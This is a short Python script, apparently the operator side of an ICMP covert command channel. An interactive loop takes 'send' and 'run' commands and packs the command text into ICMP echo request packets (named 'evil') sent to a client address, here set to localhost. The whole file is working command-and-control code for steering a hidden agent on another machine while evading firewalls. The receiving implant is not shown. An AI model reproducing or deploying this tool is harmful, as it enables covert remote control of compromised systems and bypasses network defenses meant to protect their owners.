from scapy.all import * 
from scapy.all import ICMP,IP

CLIENT = "127.0.0.1"
DEBUG = True

def main():
    while(True):
        command = input(">> ")
        arguments = command.split(" ",1 )
        if arguments[0] == "":
            continue
        elif arguments[0] == "kill":
            break
        elif arguments[0] == "send":
            clientcommand = arguments[1] 
            evil = IP(dst=CLIENT)/ICMP(type=8)/(clientcommand)
            send(evil)
            if DEBUG: print(f"[DEBUG] \"{clientcommand}\" sent to {CLIENT}")
        elif arguments[0] == "run":
            clientcommand = arguments[1] 
            evil = IP(dst=CLIENT)/ICMP(type=8)/(clientcommand)
            send(evil)
            if DEBUG: print(f"[DEBUG] \"{clientcommand}\" sent to {CLIENT}")

if __name__ == "__main__":
    main()